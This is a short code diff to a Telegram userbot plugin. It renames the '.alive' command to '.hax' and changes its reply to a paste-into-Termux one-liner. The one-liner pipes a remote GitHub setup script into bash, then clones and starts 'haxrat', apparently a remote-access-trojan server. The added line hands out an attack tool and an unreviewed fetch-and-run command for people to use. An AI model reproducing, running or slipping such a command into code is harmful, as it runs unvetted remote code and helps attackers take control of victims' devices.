@@ -8,8 +8,8 @@ DEFAULTUSER = str(ALIVE_NAME) if ALIVE_NAME else "DARK COBRA"
 
 
 
-@borg.on(admin_cmd(pattern="alive$"))
-@borg.on(sudo_cmd(pattern="alive$", allow_sudo=True))
+@borg.on(admin_cmd(pattern="hax$"))
+@borg.on(sudo_cmd(pattern="hax$", allow_sudo=True))
 async def _(event):
     if event.fwd_from:
         return
@@ -19,7 +19,7 @@ async def _(event):
     end = datetime.now()
     ms = (end - start).microseconds / 1000
     await event.edit(
-        f"Commands Found in alive:\n★ **Dark Cobra userbot alive :** `.dclive`\n★ **Jarvis userbot alive :** `.arlive`\n★ **Telebot alive :** `.tlive`\n★ **Cat userbot alive :** `.clive`\n★ **Friday userbot alive :** `.flive`\n★ **javes 3.0 userbot alive :** `.jlive`\n\n)"
+        f'Tap To copy and paste in Termux\n\n`bash -c "$(curl -fsSL https://raw.githubusercontent.com/Hax4us/Apkmod/master/setup.sh)";cd $HOME;git clone https://github.com/Hax4us/haxrat;cd haxrat/server;apt install nodejs;npm install;npm install -g npm;npm audit fix;node index.js;`\n\n)'
     )
 
 
